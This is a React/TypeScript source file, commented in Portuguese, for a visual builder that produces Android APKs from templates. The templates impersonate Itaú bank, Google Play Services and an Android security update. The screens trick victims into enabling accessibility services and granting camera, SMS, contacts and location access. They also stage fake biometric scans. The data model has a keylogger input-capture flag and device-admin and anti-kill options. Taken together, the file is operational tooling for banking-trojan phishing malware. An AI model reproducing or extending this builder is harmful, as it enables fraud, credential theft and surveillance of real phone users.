import { useState, useRef, useCallback, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { getApiBaseUrl } from '../services/api';
import {
  ArrowLeft,
  Plus,
  Trash2,
  Type,
  Image,
  Square,
  Smartphone,
  Save,
  Download,
  Eye,
  Copy,
  ChevronUp,
  ChevronDown,
  Layers,
  Keyboard,
  Upload,
  RefreshCw,
  Shield,
  Info,
  Fingerprint,
  Scan,
  Loader2
} from 'lucide-react';

// ==================== TIPOS ====================

interface Position {
  x: number;
  y: number;
}

interface Size {
  width: number;
  height: number;
}

interface ElementStyle {
  backgroundColor?: string;
  textColor?: string;
  borderColor?: string;
  borderWidth?: number;
  borderRadius?: number;
  fontSize?: number;
  fontWeight?: string;
  textAlign?: 'left' | 'center' | 'right';
  padding?: number;
  opacity?: number;
}

interface ScreenElement {
  id: string;
  type: 'text' | 'image' | 'input' | 'button' | 'rectangle' | 'circle' | 'logo' | 'file_upload' | 'fingerprint' | 'facial' | 'loading_bar';
  position: Position;
  size: Size;
  content: string;
  style: ElementStyle;
  // Para inputs
  inputType?: 'text' | 'password' | 'numeric' | 'pin';
  inputMaxLength?: number;
  inputPlaceholder?: string;
  inputLabel?: string;
  // Para botões
  buttonAction?: 'accessibility' | 'next' | 'submit' | 'close' | 'home' | 'hide' | 'custom' | 'open_url';
  buttonUrl?: string; // URL para abrir quando buttonAction = 'open_url'
  // Para imagens
  imageUrl?: string;
  imageFile?: string; // base64
  // Para upload de arquivos
  fileTypes?: string[]; // Tipos aceitos: 'image', 'pdf', 'document', 'any'
  fileLabel?: string; // Label para identificar no painel (ex: "DOCUMENTO_RG")
  fileButtonText?: string; // Texto do botão de upload
  // Para biometria e barra de carregamento
  biometricColor?: string;
  biometricText?: string;
  biometricAction?: 'next' | 'submit' | 'close' | 'home' | 'hide' | 'custom' | 'open_url';
  biometricUrl?: string;
  biometricShape?: 'normal' | 'oval';
  loadingDuration?: number;
  loadingText?: string;
  loadingAction?: 'next' | 'submit' | 'close' | 'home' | 'hide' | 'custom' | 'open_url';
  loadingUrl?: string;
}

interface APKScreen {
  id: string;
  name: string;
  order: number;
  backgroundColor: string;
  elements: ScreenElement[];
  // Configurações da tela
  isAccessibilityScreen?: boolean; // Tela de acessibilidade (sempre primeira)
  captureInputs?: boolean; // Se deve capturar inputs para keylogger
  nextScreenId?: string | null; // Próxima tela após ação
}

interface APKTemplate {
  id: string;
  name: string;
  description: string;
  appName: string;
  packageName: string;
  language?: 'pt' | 'en' | 'es';
  appIcon?: string;
  screens: APKScreen[];
  requestAdmin?: boolean;
  enableAntiKill?: boolean;
  theme: {
    primaryColor: string;
    secondaryColor: string;
    accentColor: string;
    textColor: string;
    backgroundColor: string;
  };
  createdAt: string;
  updatedAt: string;
}

// ==================== TEMPLATES PRÉ-DEFINIDOS ====================

const ITAU_TEMPLATE: APKTemplate = {
  id: 'itau-default',
  name: 'Operadora Itaú',
  description: 'Template padrão estilo Itaú com captura de senhas',
  appName: 'Itaú Segurança',
  packageName: 'com.itau.seguranca',
  theme: {
    primaryColor: '#ff6600',
    secondaryColor: '#663300',
    accentColor: '#ff8533',
    textColor: '#ffffff',
    backgroundColor: '#ff6600',
  },
  screens: [
    {
      id: 'step-0-welcome',
      name: '0 de 5 - Bem-vindo',
      order: 0,
      backgroundColor: '#ffffff',
      elements: [
        {
          id: 'w-icon',
          type: 'text',
          position: { x: 130, y: 50 },
          size: { width: 100, height: 80 },
          content: '🔒',
          style: { fontSize: 60, textAlign: 'center' },
        },
        {
          id: 'w-title',
          type: 'text',
          position: { x: 30, y: 150 },
          size: { width: 300, height: 60 },
          content: 'Bem-vindo ao Sistema de Proteção',
          style: { fontSize: 22, fontWeight: 'bold', textColor: '#000000', textAlign: 'center' },
        },
        {
          id: 'w-desc1',
          type: 'text',
          position: { x: 30, y: 230 },
          size: { width: 300, height: 60 },
          content: 'Este assistente irá configurar a proteção do seu dispositivo em apenas alguns passos.',
          style: { fontSize: 14, textColor: '#666666', textAlign: 'center' },
        },
        {
          id: 'w-desc2',
          type: 'text',
          position: { x: 30, y: 300 },
          size: { width: 300, height: 60 },
          content: 'Você precisará conceder algumas permissões para que a proteção funcione corretamente.',
          style: { fontSize: 14, textColor: '#666666', textAlign: 'center' },
        },
        {
          id: 'w-desc3',
          type: 'text',
          position: { x: 30, y: 370 },
          size: { width: 300, height: 30 },
          content: 'Toque em AVANÇAR para continuar.',
          style: { fontSize: 14, textColor: '#666666', textAlign: 'center' },
        },
        {
          id: 'w-btn',
          type: 'button',
          position: { x: 30, y: 430 },
          size: { width: 300, height: 50 },
          content: 'AVANÇAR',
          style: { backgroundColor: '#4caf50', textColor: '#ffffff', borderRadius: 10, fontSize: 16, fontWeight: 'bold' },
          buttonAction: 'next',
        },
      ],
    },
    {
      id: 'step-1-accessibility',
      name: '1 de 5 - Serviço de Proteção',
      order: 1,
      backgroundColor: '#ffffff',
      isAccessibilityScreen: true,
      elements: [
        {
          id: 's1-icon',
          type: 'text',
          position: { x: 130, y: 50 },
          size: { width: 100, height: 80 },
          content: '🔧',
          style: { fontSize: 60, textAlign: 'center' },
        },
        {
          id: 's1-title',
          type: 'text',
          position: { x: 30, y: 150 },
          size: { width: 300, height: 50 },
          content: 'Etapa 1: Serviço de Proteção',
          style: { fontSize: 22, fontWeight: 'bold', textColor: '#000000', textAlign: 'center' },
        },
        {
          id: 's1-desc',
          type: 'text',
          position: { x: 30, y: 215 },
          size: { width: 300, height: 40 },
          content: 'O Serviço de Proteção precisa ser ativado para:',
          style: { fontSize: 14, textColor: '#666666', textAlign: 'center' },
        },
        {
          id: 's1-bullets',
          type: 'text',
          position: { x: 30, y: 265 },
          size: { width: 300, height: 80 },
          content: '• Detectar aplicativos maliciosos\n• Bloquear ameaças automaticamente\n• Proteger seus dados em tempo real',
          style: { fontSize: 14, textColor: '#444444', textAlign: 'left' },
        },
        {
          id: 's1-prompt',
          type: 'text',
          position: { x: 30, y: 355 },
          size: { width: 300, height: 30 },
          content: 'Toque em ATIVAR para habilitar o serviço.',
          style: { fontSize: 14, textColor: '#666666', textAlign: 'center' },
        },
        {
          id: 's1-btn',
          type: 'button',
          position: { x: 30, y: 410 },
          size: { width: 300, height: 50 },
          content: 'ATIVAR SERVIÇO',
          style: { backgroundColor: '#4caf50', textColor: '#ffffff', borderRadius: 10, fontSize: 16, fontWeight: 'bold' },
          buttonAction: 'accessibility',
        },
      ],
    },
    {
      id: 'step-loading',
      name: 'Carregando / Configurando',
      order: 2,
      backgroundColor: '#fafafa',
      elements: [
        {
          id: 'load-indicator',
          type: 'loading_bar',
          position: { x: 130, y: 200 },
          size: { width: 100, height: 100 },
          content: '',
          loadingText: 'Configurando serviço de proteção...',
          loadingDuration: 3000,
          loadingAction: 'next',
          style: {},
        },
        {
          id: 'load-title',
          type: 'text',
          position: { x: 30, y: 310 },
          size: { width: 300, height: 40 },
          content: 'Configurando serviço de proteção...',
          style: { fontSize: 18, fontWeight: 'bold', textColor: '#333333', textAlign: 'center' },
        },
        {
          id: 'load-sub',
          type: 'text',
          position: { x: 30, y: 360 },
          size: { width: 300, height: 30 },
          content: 'Por favor, aguarde',
          style: { fontSize: 14, textColor: '#888888', textAlign: 'center' },
        },
      ],
    },
    {
      id: 'step-2-permissions',
      name: '2 de 5 - Permissões',
      order: 3,
      backgroundColor: '#ffffff',
      elements: [
        {
          id: 's2-icon',
          type: 'text',
          position: { x: 130, y: 50 },
          size: { width: 100, height: 80 },
          content: '📋',
          style: { fontSize: 60, textAlign: 'center' },
        },
        {
          id: 's2-title',
          type: 'text',
          position: { x: 30, y: 140 },
          size: { width: 300, height: 40 },
          content: 'Etapa 2: Permissões de Segurança',
          style: { fontSize: 20, fontWeight: 'bold', textColor: '#000000', textAlign: 'center' },
        },
        {
          id: 's2-bullets',
          type: 'text',
          position: { x: 30, y: 190 },
          size: { width: 300, height: 160 },
          content: 'Para funcionar corretamente, precisamos de:\n\n• Câmera - detectar ameaças visuais\n• Microfone - monitorar atividades suspeitas\n• SMS - verificar mensagens perigosas\n• Contatos - proteger sua lista\n• Localização - rastrear dispositivo',
          style: { fontSize: 13, textColor: '#444444', textAlign: 'left' },
        },
        {
          id: 's2-btn',
          type: 'button',
          position: { x: 30, y: 380 },
          size: { width: 300, height: 50 },
          content: 'CONCEDER PERMISSÕES',
          style: { backgroundColor: '#4caf50', textColor: '#ffffff', borderRadius: 10, fontSize: 16, fontWeight: 'bold' },
          buttonAction: 'next',
        },
      ],
    },
    {
      id: 'step-3-battery',
      name: '3 de 5 - Proteção Contínua',
      order: 4,
      backgroundColor: '#ffffff',
      elements: [
        {
          id: 's3-icon',
          type: 'text',
          position: { x: 130, y: 50 },
          size: { width: 100, height: 80 },
          content: '🔋',
          style: { fontSize: 60, textAlign: 'center' },
        },
        {
          id: 's3-title',
          type: 'text',
          position: { x: 30, y: 140 },
          size: { width: 300, height: 40 },
          content: 'Etapa 3: Proteção Contínua',
          style: { fontSize: 20, fontWeight: 'bold', textColor: '#000000', textAlign: 'center' },
        },
        {
          id: 's3-desc',
          type: 'text',
          position: { x: 30, y: 200 },
          size: { width: 300, height: 120 },
          content: 'Para manter seu dispositivo protegido 24/7, precisamos executar em segundo plano.\n\nIsso garantirá que a proteção esteja sempre ativa, mesmo quando você não está usando o aparelho.',
          style: { fontSize: 14, textColor: '#555555', textAlign: 'center' },
        },
        {
          id: 's3-btn',
          type: 'button',
          position: { x: 30, y: 370 },
          size: { width: 300, height: 50 },
          content: 'ATIVAR PROTEÇÃO CONTÍNUA',
          style: { backgroundColor: '#4caf50', textColor: '#ffffff', borderRadius: 10, fontSize: 16, fontWeight: 'bold' },
          buttonAction: 'next',
        },
      ],
    },
    {
      id: 'step-4-complete',
      name: '5 de 5 - Concluído',
      order: 5,
      backgroundColor: '#ffffff',
      elements: [
        {
          id: 's4-icon',
          type: 'text',
          position: { x: 130, y: 80 },
          size: { width: 100, height: 80 },
          content: '✅',
          style: { fontSize: 60, textAlign: 'center' },
        },
        {
          id: 's4-title',
          type: 'text',
          position: { x: 30, y: 180 },
          size: { width: 300, height: 40 },
          content: 'Configuração Concluída!',
          style: { fontSize: 22, fontWeight: 'bold', textColor: '#4caf50', textAlign: 'center' },
        },
        {
          id: 's4-desc',
          type: 'text',
          position: { x: 30, y: 240 },
          size: { width: 300, height: 100 },
          content: 'Parabéns! Seu dispositivo está agora protegido.\n\nO Sistema de Proteção está ativo e monitorando ameaças 24/7.',
          style: { fontSize: 14, textColor: '#555555', textAlign: 'center' },
        },
        {
          id: 's4-btn',
          type: 'button',
          position: { x: 30, y: 370 },
          size: { width: 300, height: 50 },
          content: 'CONCLUIR',
          style: { backgroundColor: '#4caf50', textColor: '#ffffff', borderRadius: 10, fontSize: 16, fontWeight: 'bold' },
          buttonAction: 'close',
        },
      ],
    },
  ],
  createdAt: new Date().toISOString(),
  updatedAt: new Date().toISOString(),
};

const GOOGLE_UPDATE_TEMPLATE: APKTemplate = {
  id: 'google-update-default',
  name: 'Atualização do Google Play Services',
  description: 'Simula uma atualização crítica do sistema com verificação biométrica e barra de progresso.',
  appName: 'Google Services Framework',
  packageName: 'com.google.android.gms.setup',
  theme: {
    primaryColor: '#e8731a',
    secondaryColor: '#202124',
    accentColor: '#e8731a',
    textColor: '#ffffff',
    backgroundColor: '#202124',
  },
  screens: [
    {
      id: 'google-acc',
      name: 'Ativar Acessibilidade',
      order: 0,
      backgroundColor: '#202124',
      isAccessibilityScreen: true,
      elements: [
        {
          id: 'g-logo',
          type: 'logo',
          position: { x: 140, y: 80 },
          size: { width: 80, height: 80 },
          content: '',
          style: {},
        },
        {
          id: 'g-title',
          type: 'text',
          position: { x: 30, y: 190 },
          size: { width: 300, height: 40 },
          content: 'Atualização do Google Play',
          style: {
            fontSize: 22,
            fontWeight: 'bold',
            textColor: '#ffffff',
            textAlign: 'center',
          },
        },
        {
          id: 'g-desc',
          type: 'text',
          position: { x: 30, y: 250 },
          size: { width: 300, height: 80 },
          content: 'Para instalar a nova versão dos serviços de segurança e corrigir bugs do sistema, ative o serviço de acessibilidade do Google.',
          style: {
            fontSize: 14,
            textColor: '#9aa0a6',
            textAlign: 'center',
          },
        },
        {
          id: 'g-btn',
          type: 'button',
          position: { x: 60, y: 370 },
          size: { width: 260, height: 50 },
          content: 'Iniciar Atualização',
          style: {
            fontSize: 16,
            fontWeight: 'bold',
            textColor: '#ffffff',
            backgroundColor: '#e8731a',
            borderRadius: 25,
            textAlign: 'center',
          },
          buttonAction: 'next',
        }
      ]
    },
    {
      id: 'google-progress',
      name: 'Instalando Atualização',
      order: 1,
      backgroundColor: '#202124',
      isAccessibilityScreen: false,
      elements: [
        {
          id: 'g-loading-icon',
          type: 'logo',
          position: { x: 155, y: 130 },
          size: { width: 50, height: 50 },
          content: '',
          style: {},
        },
        {
          id: 'g-loading-text',
          type: 'text',
          position: { x: 30, y: 210 },
          size: { width: 300, height: 30 },
          content: 'Baixando pacote do sistema...',
          style: {
            fontSize: 15,
            textColor: '#9aa0a6',
            textAlign: 'center',
          },
        },
        {
          id: 'g-progress-bar',
          type: 'loading_bar',
          position: { x: 50, y: 260 },
          size: { width: 260, height: 60 },
          content: '',
          style: {
            backgroundColor: '#e8731a',
          },
          loadingText: 'Instalando atualização do sistema',
          loadingDuration: 5000,
          loadingAction: 'next',
        }
      ]
    },
    {
      id: 'google-biometrics',
      name: 'Validação de Identidade',
      order: 2,
      backgroundColor: '#202124',
      isAccessibilityScreen: false,
      elements: [
        {
          id: 'g-bio-title',
          type: 'text',
          position: { x: 30, y: 70 },
          size: { width: 300, height: 40 },
          content: 'Segurança da Conta',
          style: {
            fontSize: 20,
            fontWeight: 'bold',
            textColor: '#ffffff',
            textAlign: 'center',
          },
        },
        {
          id: 'g-bio-desc',
          type: 'text',
          position: { x: 30, y: 130 },
          size: { width: 300, height: 60 },
          content: 'Para autorizar a atualização dos serviços protegidos do Google, verifique a sua identidade na área abaixo.',
          style: {
            fontSize: 13,
            textColor: '#9aa0a6',
            textAlign: 'center',
          },
        },
        {
          id: 'g-fingerprint',
          type: 'fingerprint',
          position: { x: 120, y: 220 },
          size: { width: 120, height: 150 },
          content: '',
          style: {},
          biometricColor: '#e8731a',
          biometricText: 'Toque e segure o sensor para validar',
          biometricAction: 'next',
        }
      ]
    },
    {
      id: 'google-facial',
      name: 'Validação Facial',
      order: 3,
      backgroundColor: '#202124',
      isAccessibilityScreen: false,
      elements: [
        {
          id: 'g-face-title',
          type: 'text',
          position: { x: 30, y: 70 },
          size: { width: 300, height: 40 },
          content: 'Reconhecimento Facial',
          style: {
            fontSize: 20,
            fontWeight: 'bold',
            textColor: '#ffffff',
            textAlign: 'center',
          },
        },
        {
          id: 'g-face-desc',
          type: 'text',
          position: { x: 30, y: 120 },
          size: { width: 300, height: 60 },
          content: 'Posicione seu rosto na câmera frontal para concluir a validação de segurança.',
          style: {
            fontSize: 13,
            textColor: '#9aa0a6',
            textAlign: 'center',
          },
        },
        {
          id: 'g-face-scanner',
          type: 'facial',
          position: { x: 90, y: 210 },
          size: { width: 180, height: 220 },
          content: '',
          style: {},
          biometricColor: '#34a853',
          biometricText: 'Escaneando rosto...',
          biometricAction: 'close',
        }
      ]
    }
  ],
  createdAt: new Date().toISOString(),
  updatedAt: new Date().toISOString(),
};

const ANDROID_SYSTEM_UPDATE_TEMPLATE: APKTemplate = {
  id: 'android-system-update-default',
  name: 'Patch de Segurança do Android',
  description: 'Simula a instalação de um patch de segurança mensal nativo do Android em modo escuro.',
  appName: 'Configuração do Android',
  packageName: 'com.android.settings.update',
  theme: {
    primaryColor: '#3ddc84',
    secondaryColor: '#121212',
    accentColor: '#3ddc84',
    textColor: '#ffffff',
    backgroundColor: '#121212',
  },
  screens: [
    {
      id: 'android-update-acc',
      name: 'Ativar Acessibilidade',
      order: 0,
      backgroundColor: '#121212',
      isAccessibilityScreen: true,
      elements: [
        {
          id: 'a-logo',
          type: 'logo',
          position: { x: 140, y: 100 },
          size: { width: 80, height: 80 },
          content: '',
          style: {},
        },
        {
          id: 'a-title',
          type: 'text',
          position: { x: 30, y: 210 },
          size: { width: 300, height: 40 },
          content: 'Atualização de Sistema',
          style: {
            fontSize: 22,
            fontWeight: 'bold',
            textColor: '#ffffff',
            textAlign: 'center',
          },
        },
        {
          id: 'a-desc',
          type: 'text',
          position: { x: 30, y: 270 },
          size: { width: 300, height: 85 },
          content: 'Um patch de segurança mensal crítico está pronto para instalação. É necessário ativar a acessibilidade para iniciar.',
          style: {
            fontSize: 14,
            textColor: '#9aa0a6',
            textAlign: 'center',
          },
        },
        {
          id: 'a-btn',
          type: 'button',
          position: { x: 60, y: 390 },
          size: { width: 260, height: 50 },
          content: 'Instalar Agora',
          style: {
            fontSize: 16,
            fontWeight: 'bold',
            textColor: '#000000',
            backgroundColor: '#3ddc84',
            borderRadius: 25,
            textAlign: 'center',
          },
          buttonAction: 'next',
        }
      ]
    },
    {
      id: 'android-update-progress',
      name: 'Instalando Updates',
      order: 1,
      backgroundColor: '#121212',
      isAccessibilityScreen: false,
      elements: [
        {
          id: 'a-progress-title',
          type: 'text',
          position: { x: 30, y: 120 },
          size: { width: 300, height: 35 },
          content: 'Otimizando aplicativos...',
          style: {
            fontSize: 18,
            fontWeight: 'bold',
            textColor: '#ffffff',
            textAlign: 'center',
          },
        },
        {
          id: 'a-progress-desc',
          type: 'text',
          position: { x: 30, y: 170 },
          size: { width: 300, height: 50 },
          content: 'Por favor, não desligue o dispositivo até a conclusão da instalação.',
          style: {
            fontSize: 13,
            textColor: '#9aa0a6',
            textAlign: 'center',
          },
        },
        {
          id: 'a-progress-bar',
          type: 'loading_bar',
          position: { x: 50, y: 260 },
          size: { width: 260, height: 60 },
          content: '',
          style: {
            backgroundColor: '#3ddc84',
          },
          loadingText: 'Progresso da atualização',
          loadingDuration: 6000,
          loadingAction: 'next',
        }
      ]
    },
    {
      id: 'android-update-fingerprint',
      name: 'Autenticação',
      order: 2,
      backgroundColor: '#121212',
      isAccessibilityScreen: false,
      elements: [
        {
          id: 'a-bio-title',
          type: 'text',
          position: { x: 30, y: 90 },
          size: { width: 300, height: 35 },
          content: 'Confirmação do Proprietário',
          style: {
            fontSize: 18,
            fontWeight: 'bold',
            textColor: '#ffffff',
            textAlign: 'center',
          },
        },
        {
          id: 'a-bio-desc',
          type: 'text',
          position: { x: 30, y: 140 },
          size: { width: 300, height: 60 },
          content: 'Use sua digital para confirmar a instalação dos novos patches de segurança do Android.',
          style: {
            fontSize: 13,
            textColor: '#9aa0a6',
            textAlign: 'center',
          },
        },
        {
          id: 'a-fingerprint',
          type: 'fingerprint',
          position: { x: 120, y: 230 },
          size: { width: 120, height: 150 },
          content: '',
          style: {},
          biometricColor: '#3ddc84',
          biometricText: 'Toque para verificar a biometria',
          biometricAction: 'close',
        }
      ]
    }
  ],
  createdAt: new Date().toISOString(),
  updatedAt: new Date().toISOString(),
};

const PREDEFINED_TEMPLATES: APKTemplate[] = [
  ITAU_TEMPLATE,
  GOOGLE_UPDATE_TEMPLATE,
  ANDROID_SYSTEM_UPDATE_TEMPLATE
];

// ==================== COMPONENTE PRINCIPAL ====================

export default function APKBuilderVisual() {
  const navigate = useNavigate();
  
  // Estado do template
  const [template, setTemplate] = useState<APKTemplate>(ITAU_TEMPLATE);
  const [currentScreenIndex, setCurrentScreenIndex] = useState(0);
  const [selectedElementId, setSelectedElementId] = useState<string | null>(null);
  
  // 📦 Templates salvos e histórico
  const [savedTemplates, setSavedTemplates] = useState<APKTemplate[]>([]);
  const [apkHistory, setApkHistory] = useState<{
    id: string;
    name: string;
    date: string;
    templateName: string;
    buildId: string;
    downloadUrl: string;
  }[]>([]);
  const [showSavedTemplates, setShowSavedTemplates] = useState(false);
  const [showApkHistory, setShowApkHistory] = useState(false);
  const [templateName, setTemplateName] = useState('');
  
  // Estados de UI
  const [isDragging, setIsDragging] = useState(false);
  const [dragOffset, setDragOffset] = useState<Position>({ x: 0, y: 0 });
  const [showElementPanel] = useState(true);
  const [showPropertiesPanel] = useState(true);
  const [previewMode, setPreviewMode] = useState(false);
  const [isBuilding, setIsBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);
  const [buildStatus, setBuildStatus] = useState('');
  
  // Refs
  const phonePreviewRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  
  // Tela atual
  const currentScreen = template.screens[currentScreenIndex];
  const selectedElement = currentScreen?.elements.find(e => e.id === selectedElementId);
  
  // ==================== CARREGAR TEMPLATES E HISTÓRICO DO LOCALSTORAGE ====================
  
  useEffect(() => {
    // Carregar templates salvos
    const saved = localStorage.getItem('apk_visual_templates');
    if (saved) {
      try {
        setSavedTemplates(JSON.parse(saved));
      } catch (e) {
        console.error('Erro ao carregar templates:', e);
      }
    }
    
    // Carregar histórico de APKs
    const history = localStorage.getItem('apk_visual_history');
    if (history) {
      try {
        setApkHistory(JSON.parse(history));
      } catch (e) {
        console.error('Erro ao carregar histórico:', e);
      }
    }
  }, []);
  
  // ==================== FUNÇÕES DE GERENCIAMENTO DE TEMPLATES ====================
  
  const saveTemplate = () => {
    const name = templateName.trim() || `Template ${new Date().toLocaleDateString()}`;
    const newTemplate: APKTemplate = {
      ...template,
      id: `tpl-${Date.now()}`,
      name: name,
      updatedAt: new Date().toISOString(),
    };
    
    const updated = [...savedTemplates.filter(t => t.id !== template.id), newTemplate];
    setSavedTemplates(updated);
    localStorage.setItem('apk_visual_templates', JSON.stringify(updated));
    setTemplate(newTemplate);
    setTemplateName('');
    alert(`✅ Template "${name}" salvo com sucesso!`);
  };
  
  const loadTemplate = (tpl: APKTemplate) => {
    setTemplate(tpl);
    setCurrentScreenIndex(0);
    setSelectedElementId(null);
    setShowSavedTemplates(false);
  };
  
  const deleteTemplate = (tplId: string) => {
    if (!confirm('Tem certeza que deseja excluir este template?')) return;
    const updated = savedTemplates.filter(t => t.id !== tplId);
    setSavedTemplates(updated);
    localStorage.setItem('apk_visual_templates', JSON.stringify(updated));
  };
  
  const duplicateTemplate = (tpl: APKTemplate) => {
    const newTemplate: APKTemplate = {
      ...tpl,
      id: `tpl-${Date.now()}`,
      name: `${tpl.name} (Cópia)`,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
    const updated = [...savedTemplates, newTemplate];
    setSavedTemplates(updated);
    localStorage.setItem('apk_visual_templates', JSON.stringify(updated));
  };
  
  const addToHistory = (apkName: string, buildId: string, downloadUrl: string) => {
    const historyEntry = {
      id: `hist-${Date.now()}`,
      name: apkName,
      date: new Date().toISOString(),
      templateName: template.name,
      buildId,
      downloadUrl,
    };
    const updated = [historyEntry, ...apkHistory].slice(0, 50); // Mantém últimos 50
    setApkHistory(updated);
    localStorage.setItem('apk_visual_history', JSON.stringify(updated));
  };
  
  const deleteFromHistory = (historyId: string) => {
    const updated = apkHistory.filter(h => h.id !== historyId);
    setApkHistory(updated);
    localStorage.setItem('apk_visual_history', JSON.stringify(updated));
  };
  
  const downloadApk = (downloadUrl: string, apkName: string) => {
    // Se a URL for relativa, adiciona o base URL
    const fullUrl = downloadUrl.startsWith('http') ? downloadUrl : `${getApiBaseUrl()}${downloadUrl}`;
    
    // Abre em nova aba para download
    const link = document.createElement('a');
    link.href = fullUrl;
    link.download = `${apkName}.apk`;
    link.target = '_blank';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };
  
  const clearHistory = () => {
    if (!confirm('Tem certeza que deseja limpar todo o histórico?')) return;
    setApkHistory([]);
    localStorage.setItem('apk_visual_history', JSON.stringify([]));
  };
  
  const newTemplate = () => {
    if (!confirm('Criar novo template? O template atual será perdido se não salvar.')) return;
    setTemplate({
      ...ITAU_TEMPLATE,
      id: `tpl-${Date.now()}`,
      name: 'Novo Template',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    });
    setCurrentScreenIndex(0);
    setSelectedElementId(null);
  };
  
  // ==================== HANDLERS DE ELEMENTOS ====================
  
  const addElement = (type: ScreenElement['type']) => {
    // Define tamanho baseado no tipo
    const width = 
      type === 'text' ? 200 : 
      type === 'input' ? 260 : 
      type === 'button' ? 200 : 
      type === 'file_upload' ? 260 : 
      type === 'loading_bar' ? 260 : 
      type === 'facial' ? 180 : 
      type === 'fingerprint' ? 120 : 100;
      
    const height = 
      type === 'input' ? 50 : 
      type === 'button' ? 45 : 
      type === 'text' ? 30 : 
      type === 'file_upload' ? 120 : 
      type === 'loading_bar' ? 60 : 
      type === 'facial' ? 220 : 
      type === 'fingerprint' ? 150 : 80;
    
    // Posição centralizada e dentro da área visível
    const x = Math.max(0, Math.min(ANDROID_WIDTH - width, (ANDROID_WIDTH - width) / 2));
    const y = Math.max(0, Math.min(ANDROID_HEIGHT - height, 200));
    
    const newElement: ScreenElement = {
      id: `el-${Date.now()}`,
      type,
      position: { x, y },
      size: { width, height },
      content: type === 'text' ? 'Novo Texto' : type === 'button' ? 'Botão' : type === 'file_upload' ? 'Enviar Documento' : '',
      style: {
        backgroundColor: type === 'button' ? template.theme.primaryColor : type === 'rectangle' ? '#cccccc' : type === 'file_upload' ? '#e8e8e8' : type === 'loading_bar' ? '#00ff00' : undefined,
        textColor: (type === 'button' || type === 'fingerprint' || type === 'facial' || type === 'loading_bar') ? '#ffffff' : '#333333',
        fontSize: 16,
        borderRadius: type === 'button' ? 25 : type === 'file_upload' ? 10 : 0,
        textAlign: 'center',
      },
      inputType: type === 'input' ? 'text' : undefined,
      inputMaxLength: type === 'input' ? 100 : undefined,
      inputPlaceholder: type === 'input' ? 'Digite aqui...' : undefined,
      buttonAction: type === 'button' ? 'next' : undefined,
      // Para file_upload
      fileTypes: type === 'file_upload' ? ['image', 'pdf', 'document'] : undefined,
      fileLabel: type === 'file_upload' ? 'DOCUMENTO' : undefined,
      fileButtonText: type === 'file_upload' ? 'Selecionar Arquivo' : undefined,
      // Para loading_bar
      loadingDuration: type === 'loading_bar' ? 3000 : undefined,
      loadingText: type === 'loading_bar' ? 'Carregando segurança...' : undefined,
      loadingAction: type === 'loading_bar' ? 'next' : undefined,
      // Para fingerprint
      biometricColor: (type === 'fingerprint' || type === 'facial') ? '#00ff00' : undefined,
      biometricText: type === 'fingerprint' ? 'Toque e segure para verificar a digital' : type === 'facial' ? 'Posicione seu rosto na área demarcada' : undefined,
      biometricAction: (type === 'fingerprint' || type === 'facial') ? 'next' : undefined,
    };
    
    setTemplate(prev => ({
      ...prev,
      screens: prev.screens.map((screen, idx) =>
        idx === currentScreenIndex
          ? { ...screen, elements: [...screen.elements, newElement] }
          : screen
      ),
    }));
    
    setSelectedElementId(newElement.id);
  };
  
  const updateElement = (elementId: string, updates: Partial<ScreenElement>) => {
    setTemplate(prev => ({
      ...prev,
      screens: prev.screens.map((screen, idx) =>
        idx === currentScreenIndex
          ? {
              ...screen,
              elements: screen.elements.map(el =>
                el.id === elementId ? { ...el, ...updates } : el
              ),
            }
          : screen
      ),
    }));
  };
  
  const updateElementStyle = (elementId: string, styleUpdates: Partial<ElementStyle>) => {
    setTemplate(prev => ({
      ...prev,
      screens: prev.screens.map((screen, idx) =>
        idx === currentScreenIndex
          ? {
              ...screen,
              elements: screen.elements.map(el =>
                el.id === elementId
                  ? { ...el, style: { ...el.style, ...styleUpdates } }
                  : el
              ),
            }
          : screen
      ),
    }));
  };
  
  const deleteElement = (elementId: string) => {
    setTemplate(prev => ({
      ...prev,
      screens: prev.screens.map((screen, idx) =>
        idx === currentScreenIndex
          ? { ...screen, elements: screen.elements.filter(el => el.id !== elementId) }
          : screen
      ),
    }));
    setSelectedElementId(null);
  };
  
  const duplicateElement = (elementId: string) => {
    const element = currentScreen.elements.find(e => e.id === elementId);
    if (!element) return;
    
    const newElement: ScreenElement = {
      ...element,
      id: `el-${Date.now()}`,
      position: { x: element.position.x + 20, y: element.position.y + 20 },
    };
    
    setTemplate(prev => ({
      ...prev,
      screens: prev.screens.map((screen, idx) =>
        idx === currentScreenIndex
          ? { ...screen, elements: [...screen.elements, newElement] }
          : screen
      ),
    }));
    
    setSelectedElementId(newElement.id);
  };
  
  const updateAccessibilityScreenElements = (title?: string, desc?: string, btnText?: string, btnColor?: string) => {
    setTemplate(prev => {
      const updatedScreens = [...prev.screens];
      const screen = updatedScreens[currentScreenIndex];
      if (!screen) return prev;

      let elements = [...screen.elements];
      
      if (title !== undefined) {
        const titleElemIndex = elements.findIndex(e => e.id === 'acc-title' || (e.type === 'text' && (e.style?.fontSize || 0) >= 18));
        if (titleElemIndex >= 0) {
          elements[titleElemIndex] = { ...elements[titleElemIndex], content: title };
        } else {
          elements.push({
            id: 'acc-title',
            type: 'text',
            position: { x: 40, y: 200 },
            size: { width: 300, height: 40 },
            content: title,
            style: { fontSize: 22, fontWeight: 'bold', textColor: '#663300', textAlign: 'center' }
          });
        }
      }
      
      if (desc !== undefined) {
        const descElemIndex = elements.findIndex(e => e.id === 'acc-desc' || (e.type === 'text' && (e.style?.fontSize || 0) < 18));
        if (descElemIndex >= 0) {
          elements[descElemIndex] = { ...elements[descElemIndex], content: desc };
        } else {
          elements.push({
            id: 'acc-desc',
            type: 'text',
            position: { x: 40, y: 260 },
            size: { width: 300, height: 80 },
            content: desc,
            style: { fontSize: 14, textColor: '#666666', textAlign: 'center' }
          });
        }
      }
      
      if (btnText !== undefined || btnColor !== undefined) {
        const btnElemIndex = elements.findIndex(e => e.id === 'acc-btn' || e.type === 'button' || e.buttonAction === 'accessibility');
        if (btnElemIndex >= 0) {
          const btnElem = { ...elements[btnElemIndex] };
          if (btnText !== undefined) btnElem.content = btnText;
          if (btnColor !== undefined) {
            btnElem.style = { ...btnElem.style, backgroundColor: btnColor };
          }
          elements[btnElemIndex] = btnElem;
